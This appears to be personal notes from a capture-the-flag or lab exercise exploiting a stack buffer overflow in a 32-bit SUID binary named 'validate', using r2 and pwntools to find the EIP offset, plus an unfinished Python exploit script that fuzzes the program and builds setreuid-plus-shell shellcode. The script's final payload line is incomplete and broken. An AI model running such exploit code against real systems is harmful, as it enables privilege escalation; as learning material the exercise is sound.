
As this is a command line executable that just takes the input argument and the execution is finished in no time at all there's no way to attach to it. It's also not suitable to use a graphical debugger. Let's go for r2.

We use pwntools cyclic() to generate a non repetitive string:
`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab`

We run r2.
```sh
┌──(kali㉿kali)-[~/bof]
└─$ r2 -d -A validate aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: glibc.fc_offset = 0x00148
...
[0xf7f99be0]> dc
[+] SIGNAL 11 errno=0 addr=0x62616165 code=1 si_pid=1650549093 ret=0
[0x62616165]> 
```

EIP ends up at 0x62616165

We used pwn cyclic-find() to get the position of this in the string: 116

This is the position where we will


Making script - not finished
```python
#!/usr/bin/env python3
# #2025-01-24

from pwn import *
import subprocess
context.log_level = "error"

executable = "./validate"
r2_path = "/usr/bin/r2"
r2_arguments = "-d"
fuzz_step = 10

print("\nRunning executable with increasing size arguments")
length = 0
while True:
  print(".",end="")
  length += fuzz_step
  io = subprocess.run([executable, "A"*length])
  if not io.returncode == 0:
    print("\nProgram crashed at "+str(length))
    crash_length = length
    break

print("\nGenerating non repeating string")
cyclic_string = cyclic(crash_length)
print(cyclic_string)

print("\nRunning executable in r2 with the generated string")
io = process([r2_path, r2_arguments, executable, cyclic_string])

#put the command to start running the program in the buffer
io.sendline(b'dc\n')

while True:
  received_line = io.recvlineS().strip()
  #print(received_line)

  if 'SIGNAL 11' in received_line:
    print("Buffer overflow: "+received_line)
    pos = received_line.find("addr=")
    crash_address = int(received_line[pos+5:][:10],0)
    print("Crash address: "+str(crash_address))
    break

#quitting r2
io.sendline(b'q\n')

print("\nFinding eip position using r2 output of crash address")
eip_position = cyclic_find(crash_address)
print("EIP position: "+str(eip_position))

print("\nGenerating shellcode for a SUID binary - user id 1001")
context.arch = "i386"
context.bits = 32
shell_i386 = shellcraft.i386.linux.setreuid("1001")+shellcraft.i386.linux.sh()
#print(shell_i386) # outputs assembler code
shellcode = asm(shell_i386)
print("Shellcode: "+str(shellcode)) # generates machine code in bytes format
print("Shellcode length: "+str(len(shellcode))+"bytes")

#badchars?

#address for jmp esp or something - OR just the address we're on when writing

e = ELF(executable)

print("\nFunctions:")
for function in e.functions.values():
  print("\nDisassembling function %s at %#x" % (function.name, function.address))
  print(e.disasm(e.symbols[function.name], function.size))

address = 0 #where we have jmp esp or something

print("\nThe full payload would be")
#payload = b"A"*eip_position+address
payload = +address

```